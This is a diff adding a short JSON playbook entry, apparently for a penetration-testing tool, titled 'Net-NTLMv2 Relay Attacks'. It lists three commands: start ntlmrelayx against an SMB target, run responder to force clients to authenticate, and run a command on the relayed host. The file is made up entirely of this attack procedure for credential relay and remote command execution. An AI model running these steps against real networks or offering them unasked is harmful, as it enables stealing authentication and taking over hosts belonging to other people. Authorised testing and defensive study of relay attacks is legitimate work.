@@ -1,0 +1,25 @@
+{
+	"name": "Net-NTLMv2 Relay Attacks",
+	"description": "Relay captured hashes to authenticate elsewhere.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Start ntlmrelayx",
+			"command": "ntlmrelayx.py -t smb://target.com -smb-port 445",
+			"description": "Relay to SMB."
+		},
+		{
+			"index": 2,
+			"name": "Trigger Auth",
+			"command": "responder -I eth0 --lm",
+			"description": "Force client to authenticate."
+		},
+		{
+			"index": 3,
+			"name": "Execute Command",
+			"command": "ntlmrelayx.py -t smb://target -c \"whoami\"",
+			"description": "Run on relayed host."
+		}
+	]
+}
